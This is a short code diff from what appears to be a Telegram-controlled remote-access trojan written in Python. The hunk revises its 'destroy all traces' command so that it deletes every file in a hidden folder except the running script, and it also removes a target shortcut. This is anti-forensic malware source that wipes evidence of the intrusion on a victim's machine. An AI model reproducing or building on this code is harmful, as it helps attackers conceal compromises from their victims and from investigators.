@@ -162,7 +162,9 @@ def handle(msg):
 				bot.sendChatAction(chat_id, 'typing')
 				bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
 				if os.path.exists(hide_folder):
-					rmtree(hide_folder)
+					for file in os.listdir(hide_folder):
+						if not file == argv[0]:
+							os.remove(hide_folder + '\\' + file)
 				if os.path.isfile(target_shortcut):
 					os.remove(target_shortcut)
 				while True:
